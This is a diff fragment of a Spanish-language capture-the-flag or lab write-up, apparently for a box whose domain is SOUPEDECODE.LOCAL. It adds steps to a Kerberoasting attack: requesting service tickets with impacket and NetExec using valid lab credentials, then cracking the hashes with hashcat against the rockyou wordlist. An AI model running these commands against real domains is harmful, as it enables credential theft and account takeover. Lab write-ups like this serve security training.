@@ -65,3 +65,15 @@ al tener unas credenciales validas así que podemos probar a hacer un ataque de 
 impacket-GetUserSPNs -dc-ip 10.114.135.170 SOUPEDECODE.LOCAL/ybob317 -request
 ```
 
+Tambien se puden obtener
+```shell
+nxc ldap 10.114.135.170 -u ybob317 -p ybob317 --kerberoasting
+```
+
+Nos lo guardamos en un fichero los hashes
+
+Y los crackeamos
+```shell
+hashcat -m 13100 hashes /usr/share/wordlists/rockyou.txt
+```
+
